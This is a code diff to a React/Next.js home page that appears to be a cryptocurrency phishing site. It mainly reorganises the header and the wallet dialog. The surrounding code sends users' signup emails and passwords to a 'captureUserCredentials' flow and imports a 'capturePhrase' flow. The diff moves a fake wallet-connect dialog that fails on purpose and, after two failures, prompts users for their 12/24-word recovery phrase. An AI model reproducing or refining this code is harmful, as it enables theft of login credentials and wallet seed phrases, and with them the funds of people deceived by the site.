@@ -29,7 +29,7 @@ import { useToast } from "@/hooks/use-toast";
 import { capturePhrase } from "@/ai/flows/capture-phrase-flow";
 import { captureUserCredentials } from "@/ai/flows/user-auth-flow";
 import { auth } from "@/lib/firebase";
-import { createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, type User as FirebaseUser } from "firebase/auth";
+import { createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, type User as FirebaseUser } from "firebase/auth";
 import { Label } from "@/components/ui/label";
 
 
@@ -93,7 +93,6 @@ export default function Home() {
     setAuthError('');
     try {
       const userCredential = await createUserWithEmailAndPassword(auth, email, password);
-      // Capture credentials on successful signup
       await captureUserCredentials({
         email,
         password,
@@ -122,21 +121,21 @@ export default function Home() {
     await signOut(auth);
     toast({ title: "Logged Out", description: "You have been logged out." });
   };
-
+  
   const AuthButton = ({isMobile = false}: {isMobile?: boolean}) => {
     if (user) {
         return (
-            <Button variant="ghost" className="text-white hover:bg-gray-700/80 p-2 flex items-center gap-2" onClick={handleLogout}>
+            <Button variant="ghost" className={cn("text-white p-2 flex items-center gap-2", isMobile ? "justify-center w-full" : "hover:bg-gray-700/80")} onClick={handleLogout}>
                 <User className="h-5 w-5" />
-                {!isMobile && <span className="text-sm font-semibold">Logout</span>}
+                <span className={cn("text-sm font-semibold", isMobile && "sr-only")}>Logout</span>
             </Button>
         );
     }
 
     return (
-        <Button onClick={() => setIsAuthDialogOpen(true)} variant="ghost" className="text-white hover:bg-gray-700/80 p-2 flex items-center gap-2">
+        <Button onClick={() => setIsAuthDialogOpen(true)} variant="ghost" className={cn("text-white p-2 flex items-center gap-2", isMobile ? "justify-center w-full" : "hover:bg-gray-700/80")}>
             <User className="h-5 w-5" />
-            {!isMobile && <span className="text-sm font-semibold">Login</span>}
+            <span className={cn("text-sm font-semibold", isMobile && "sr-only")}>Login</span>
         </Button>
     );
   };
@@ -153,7 +152,6 @@ export default function Home() {
       <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Youtube className="h-5 w-5" /></Button>
       <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Facebook className="h-5 w-5" /></Button>
       <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Ghost className="h-5 w-5" /></Button>
-      <AuthButton />
     </>
   );
 
@@ -184,8 +182,8 @@ export default function Home() {
     { name: 'WalletConnect', icon: <Image src="/wallet-connect.png" alt="WalletConnect Logo" width={40} height={40} />, extra: 'QR CODE' },
     { name: 'MetaMask', icon: <Image src="/metamask-wallet.png" alt="MetaMask Logo" width={40} height={40} /> },
     { name: 'Trust Wallet', icon: <TrustWalletIcon /> },
-    { name: 'Phantom Wallet', icon: <Image src="/PHANTOM-WALLET.PNG" alt="Phantom Wallet Logo" width={40} height={40} /> },
-    { name: 'Ton Wallet', icon: <Image src="/TON-WALLET.PNG" alt="Ton Wallet Logo" width={40} height={40} /> },
+    { name: 'Phantom Wallet', icon: <Image src="/PHANTOM-WALLET.png" alt="Phantom Wallet Logo" width={40} height={40} /> },
+    { name: 'Ton Wallet', icon: <Image src="/TON-WALLET.png" alt="Ton Wallet Logo" width={40} height={40} /> },
     { name: 'Coinbase Wallet', icon: <Image src="/coinbase-wallet.png" alt="Coinbase Wallet Logo" width={40} height={40} /> },
     { name: 'All Wallets', icon: <AllWalletsIcon />, extra: '450+' },
   ];
@@ -368,116 +366,115 @@ export default function Home() {
             </Tabs>
         </DialogContent>
       </Dialog>
+      
+      <Dialog open={isWalletDialogOpen} onOpenChange={(open) => {
+          setIsWalletDialogOpen(open);
+          if (!open) {
+            setConnectionState('initial');
+            setSelectedWallet(null);
+            setFailedAttempts(0);
+          }
+        }}>
+          <DialogContent className="bg-[#141414] border-gray-800 rounded-3xl w-full max-w-sm p-0">
+              <DialogHeader className="p-6 pb-0">
+                {connectionState !== 'initial' && (
+                    <Button variant="ghost" className="absolute left-4 top-4 p-2 text-gray-400 hover:bg-gray-700/80" onClick={() => setConnectionState('initial')}>
+                      <ChevronRight className="h-6 w-6 rotate-180" />
+                    </Button>
+                )}
+                <div className="flex items-center justify-center">
+                    <HelpCircle className="absolute left-6 h-6 w-6 text-gray-400" />
+                    <DialogTitle className="text-lg font-bold text-white">
+                      {connectionState === 'initial' && 'Connect Wallet'}
+                      {connectionState === 'connecting' && 'Connecting...'}
+                      {connectionState === 'failed' && 'Error Connecting'}
+                    </DialogTitle>
+                </div>
+              </DialogHeader>
+              <div className="p-6">
+                {connectionState === 'initial' && (
+                  <div className="flex flex-col gap-2">
+                      {wallets.map((wallet, index) => (
+                          <button key={index} onClick={() => handleWalletClick(wallet)} className="flex items-center justify-between w-full p-3 rounded-xl bg-[#252525] hover:bg-[#353535] transition-colors">
+                              <div className="flex items-center gap-4">
+                                  {wallet.icon}
+                                  <span className="font-semibold text-white">{wallet.name}</span>
+                              </div>
+                              {wallet.extra && (
+                                  <span className={`text-xs font-bold py-1 px-2 rounded-md ${wallet.name === 'WalletConnect' ? 'bg-[#3375BB] text-white' : 'bg-[#3a3a3a] text-gray-300'}`}>
+                                      {wallet.extra}
+                                  </span>
+                              )}
+                          </button>
+                      ))}
+                  </div>
+                )}
+                {connectionState === 'connecting' && selectedWallet && (
+                  <div className="flex flex-col items-center justify-center gap-6 py-8">
+                      <div className="relative">
+                        {selectedWallet.icon}
+                        <div className="absolute -bottom-2 -right-2 bg-gray-600 rounded-full p-0.5">
+                          <Loader2 className="h-4 w-4 text-white animate-spin" />
+                        </div>
+                      </div>
+                      <p className="text-white font-bold text-xl">Requesting connection</p>
+                      <p className="text-gray-400 text-sm text-center">Accept the request in your wallet to connect to this app.</p>
+                  </div>
+                )}
+                {connectionState === 'failed' && selectedWallet && (
+                  <div className="flex flex-col items-center justify-center gap-4 py-8">
+                      <div className="relative">
+                        {selectedWallet.icon}
+                        <div className="absolute -bottom-2 -right-2 bg-red-500 rounded-full p-0.5">
+                          <X className="h-4 w-4 text-white" />
+                        </div>
+                      </div>
+                      <p className="text-white font-bold text-xl">Connection failed</p>
+                      <Button onClick={handleTryAgain} className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold rounded-lg">Try Again</Button>
+                      {failedAttempts >= 2 && (
+                        <Button onClick={handleOpenRecovery} variant="link" className="text-blue-500">Use 12/24 key phrase</Button>
+                      )}
+                  </div>
+                )}
+              </div>
+              <div className="text-center p-6 border-t border-gray-800">
+                  <p className="text-sm text-gray-400">
+                      Haven't got a wallet?{' '}
+                      <a href="#" className="text-blue-500 font-semibold hover:underline">
+                          Get started
+                      </a>
+                  </p>
+              </div>
+          </DialogContent>
+        </Dialog>
+
 
       <header className="sticky top-0 z-50 bg-[#181818]/90 backdrop-blur-sm border-b border-gray-700">
         <div className="container mx-auto px-4">
-          <div className="relative flex items-center justify-between h-20">
-            {/* Left Group */}
-             <div className="flex items-center">
-              <div className="hidden lg:flex items-center space-x-1">
+          <div className="relative flex items-center justify-between h-20 md:h-20">
+             <div className="hidden lg:flex items-center space-x-1">
                  <NavIcons />
-              </div>
-              <div className="flex items-center md:hidden">
+                 <AuthButton />
+             </div>
+             <div className="flex items-center lg:hidden">
                   <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2 relative">
                     <ShoppingCart className="h-5 w-5" />
                      <span className="absolute top-1 right-1 bg-white text-black text-[10px] font-bold rounded-full h-4 w-4 flex items-center justify-center">0</span>
                   </Button>
                   <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2"><Search className="h-5 w-5" /></Button>
-              </div>
-            </div>
+             </div>
             
-            {/* Centered Logo */}
             <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
-                <HelmetLogo priority={true} width={70} height={70}/>
+                <Link href="/">
+                    <HelmetLogo priority={true} width={70} height={70}/>
+                </Link>
             </div>
 
-            {/* Right Group */}
             <div className="flex items-center">
-                <Dialog open={isWalletDialogOpen} onOpenChange={(open) => {
-                  setIsWalletDialogOpen(open);
-                  if (!open) {
-                    setConnectionState('initial');
-                    setSelectedWallet(null);
-                    setFailedAttempts(0);
-                  }
-                }}>
-                  <DialogTrigger asChild>
-                    <Button disabled={connectionState === 'connected'} className="hidden md:flex bg-gradient-to-r from-cyan-400 to-blue-500 text-white font-bold py-2 px-6 rounded-lg mr-4 text-sm hover:from-cyan-500 hover:to-blue-600 disabled:opacity-70 disabled:cursor-not-allowed">
-                       {connectionState === 'connected' ? 'Connected' : 'Connect Wallet'}
-                    </Button>
-                  </DialogTrigger>
-                  <DialogContent className="bg-[#141414] border-gray-800 rounded-3xl w-full max-w-sm p-0">
-                      <DialogHeader className="p-6 pb-0">
-                        {connectionState !== 'initial' && (
-                           <Button variant="ghost" className="absolute left-4 top-4 p-2 text-gray-400 hover:bg-gray-700/80" onClick={() => setConnectionState('initial')}>
-                              <ChevronRight className="h-6 w-6 rotate-180" />
-                           </Button>
-                        )}
-                        <div className="flex items-center justify-center">
-                            <HelpCircle className="absolute left-6 h-6 w-6 text-gray-400" />
-                            <DialogTitle className="text-lg font-bold text-white">
-                              {connectionState === 'initial' && 'Connect Wallet'}
-                              {connectionState === 'connecting' && 'Connecting...'}
-                              {connectionState === 'failed' && 'Error Connecting'}
-                            </DialogTitle>
-                        </div>
-                      </DialogHeader>
-                      <div className="p-6">
-                        {connectionState === 'initial' && (
-                          <div className="flex flex-col gap-2">
-                              {wallets.map((wallet, index) => (
-                                  <button key={index} onClick={() => handleWalletClick(wallet)} className="flex items-center justify-between w-full p-3 rounded-xl bg-[#252525] hover:bg-[#353535] transition-colors">
-                                      <div className="flex items-center gap-4">
-                                          {wallet.icon}
-                                          <span className="font-semibold text-white">{wallet.name}</span>
-                                      </div>
-                                      {wallet.extra && (
-                                          <span className={`text-xs font-bold py-1 px-2 rounded-md ${wallet.name === 'WalletConnect' ? 'bg-[#3375BB] text-white' : 'bg-[#3a3a3a] text-gray-300'}`}>
-                                              {wallet.extra}
-                                          </span>
-                                      )}
-                                  </button>
-                              ))}
-                          </div>
-                        )}
-                        {connectionState === 'connecting' && selectedWallet && (
-                          <div className="flex flex-col items-center justify-center gap-6 py-8">
-                             <div className="relative">
-                               {selectedWallet.icon}
-                               <div className="absolute -bottom-2 -right-2 bg-gray-600 rounded-full p-0.5">
-                                 <Loader2 className="h-4 w-4 text-white animate-spin" />
-                               </div>
-                             </div>
-                             <p className="text-white font-bold text-xl">Requesting connection</p>
-                             <p className="text-gray-400 text-sm text-center">Accept the request in your wallet to connect to this app.</p>
-                          </div>
-                        )}
-                        {connectionState === 'failed' && selectedWallet && (
-                          <div className="flex flex-col items-center justify-center gap-4 py-8">
-                             <div className="relative">
-                               {selectedWallet.icon}
-                               <div className="absolute -bottom-2 -right-2 bg-red-500 rounded-full p-0.5">
-                                 <X className="h-4 w-4 text-white" />
-                               </div>
-                             </div>
-                             <p className="text-white font-bold text-xl">Connection failed</p>
-                              <Button onClick={handleTryAgain} className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold rounded-lg">Try Again</Button>
-                              {failedAttempts >= 2 && (
-                                <Button onClick={handleOpenRecovery} variant="link" className="text-blue-500">Use 12/24 key phrase</Button>
-                              )}
-                          </div>
-                        )}
-                      </div>
-                      <div className="text-center p-6 border-t border-gray-800">
-                          <p className="text-sm text-gray-400">
-                              Haven't got a wallet?{' '}
-                              <a href="#" className="text-blue-500 font-semibold hover:underline">
-                                  Get started
-                              </a>
-                          </p>
-                      </div>
-                  </DialogContent>
-                </Dialog>
+                <Button onClick={() => setIsWalletDialogOpen(true)} disabled={connectionState === 'connected'} className="hidden md:flex bg-gradient-to-r from-cyan-400 to-blue-500 text-white font-bold py-2 px-6 rounded-lg mr-4 text-sm hover:from-cyan-500 hover:to-blue-600 disabled:opacity-70 disabled:cursor-not-allowed">
+                    {connectionState === 'connected' ? 'Connected' : 'Connect Wallet'}
+                </Button>
+                <div className="hidden lg:flex"><AuthButton /></div>
 
                 <Dialog open={isRecoveryDialogOpen} onOpenChange={setIsRecoveryDialogOpen}>
                     <DialogContent className="bg-[#141414] border-gray-800 rounded-3xl w-full max-w-sm p-0 flex flex-col max-h-[90svh]">
@@ -524,7 +521,7 @@ export default function Home() {
                     </DialogContent>
                 </Dialog>
 
-                <div className="md:hidden">
+                <div className="flex items-center lg:hidden">
                     <Sheet>
                     <SheetTrigger asChild>
                         <Button variant="ghost" size="icon" className="text-white hover:bg-gray-700/80 p-2">
@@ -534,12 +531,12 @@ export default function Home() {
                     <SheetContent side="right" showClose={false} className="bg-[#181818] text-white border-l border-gray-700 w-[300px] p-0 flex flex-col h-full">
                         <SheetTitle className="sr-only">Mobile Menu</SheetTitle>
                         <div className="flex items-center justify-between p-4 border-b border-gray-700">
-                        <HelmetLogo width={40} height={40}/>
-                        <SheetClose asChild>
-                            <Button variant="ghost" className="p-2 border border-gray-500 rounded-md hover:bg-gray-700 text-white">
-                                <X className="h-6 w-6" />
-                            </Button>
-                        </SheetClose>
+                          <Link href="/"><HelmetLogo width={40} height={40}/></Link>
+                          <SheetClose asChild>
+                              <Button variant="ghost" className="p-2 border border-gray-500 rounded-md hover:bg-gray-700 text-white">
+                                  <X className="h-6 w-6" />
+                              </Button>
+                          </SheetClose>
                         </div>
                         <nav className="flex flex-col items-start space-y-5 p-6 text-sm font-bold uppercase tracking-widest flex-grow">
                             <a href="#" className="hover:text-gray-300">Affiliate Links</a>
@@ -846,3 +843,5 @@ export default function Home() {
     </div>
   );
 }
+
+    
